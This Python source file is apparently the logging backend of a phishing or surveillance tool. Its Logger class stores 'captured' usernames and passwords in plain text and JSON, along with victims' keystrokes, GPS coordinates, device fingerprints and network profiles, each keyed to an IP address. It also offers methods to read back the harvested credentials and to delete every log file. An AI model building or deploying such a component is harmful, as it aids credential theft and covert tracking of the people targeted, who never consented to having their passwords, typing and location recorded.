#!/usr/bin/env python3
# Logger Module - Handles all logging operations
# Author: xspeen

import json
import os
from datetime import datetime
from threading import Lock

class Logger:
    def __init__(self, log_dir='logs'):
        self.log_dir = log_dir
        self.lock = Lock()
        os.makedirs(log_dir, exist_ok=True)

    def log_credentials(self, ip, username, password):
        """Log captured credentials"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        entry = f"[{timestamp}] {ip} | {username}:{password}"

        with self.lock:
            # Plain text log
            with open(f'{self.log_dir}/credentials.log', 'a') as f:
                f.write(entry + '\n')

            # JSON log
            json_entry = {
                'timestamp': timestamp,
                'ip': ip,
                'username': username,
                'password': password,
                'type': 'credentials'
            }
            with open(f'{self.log_dir}/credentials.json', 'a') as f:
                f.write(json.dumps(json_entry) + '\n')

        return True

    def log_device(self, ip, device_data):
        """Log device fingerprint"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        with self.lock:
            device_data['timestamp'] = timestamp
            device_data['ip'] = ip
            with open(f'{self.log_dir}/devices.json', 'a') as f:
                f.write(json.dumps(device_data) + '\n')

        return True

    def log_location(self, ip, lat, lon, accuracy=None):
        """Log GPS location"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        accuracy_str = f" (accuracy: {accuracy}m)" if accuracy else ""
        entry = f"[{timestamp}] {ip} | {lat},{lon}{accuracy_str}"

        with self.lock:
            with open(f'{self.log_dir}/locations.txt', 'a') as f:
                f.write(entry + '\n')

            json_entry = {
                'timestamp': timestamp,
                'ip': ip,
                'latitude': lat,
                'longitude': lon,
                'accuracy': accuracy
            }
            with open(f'{self.log_dir}/locations.json', 'a') as f:
                f.write(json.dumps(json_entry) + '\n')

        return True

    def log_keystrokes(self, ip, keystrokes):
        """Log keystroke data"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        with self.lock:
            entry = f"[{timestamp}] {ip} | {json.dumps(keystrokes)}"
            with open(f'{self.log_dir}/keystrokes.log', 'a') as f:
                f.write(entry + '\n')

        return True

    def log_network(self, ip, network_data):
        """Log network information"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        with self.lock:
            network_data['timestamp'] = timestamp
            network_data['public_ip'] = ip
            with open(f'{self.log_dir}/network_profiles.json', 'a') as f:
                f.write(json.dumps(network_data) + '\n')

        return True

    def get_all_credentials(self):
        """Retrieve all captured credentials"""
        credentials = []
        json_path = f'{self.log_dir}/credentials.json'
        if os.path.exists(json_path):
            with open(json_path, 'r') as f:
                for line in f:
                    try:
                        credentials.append(json.loads(line.strip()))
                    except:
                        pass
        return credentials

    def get_all_devices(self):
        """Retrieve all device fingerprints"""
        devices = []
        json_path = f'{self.log_dir}/devices.json'
        if os.path.exists(json_path):
            with open(json_path, 'r') as f:
                for line in f:
                    try:
                        devices.append(json.loads(line.strip()))
                    except:
                        pass
        return devices

    def get_all_locations(self):
        """Retrieve all locations"""
        locations = []
        json_path = f'{self.log_dir}/locations.json'
        if os.path.exists(json_path):
            with open(json_path, 'r') as f:
                for line in f:
                    try:
                        locations.append(json.loads(line.strip()))
                    except:
                        pass
        return locations

    def clear_logs(self):
        """Clear all log files"""
        with self.lock:
            for filename in os.listdir(self.log_dir):
                filepath = os.path.join(self.log_dir, filename)
                if os.path.isfile(filepath):
                    os.remove(filepath)
        return True

    def get_stats(self):
        """Get logging statistics"""
        stats = {}
        for filename in os.listdir(self.log_dir):
            filepath = os.path.join(self.log_dir, filename)
            if os.path.isfile(filepath):
                stats[filename] = os.path.getsize(filepath)
        return stats
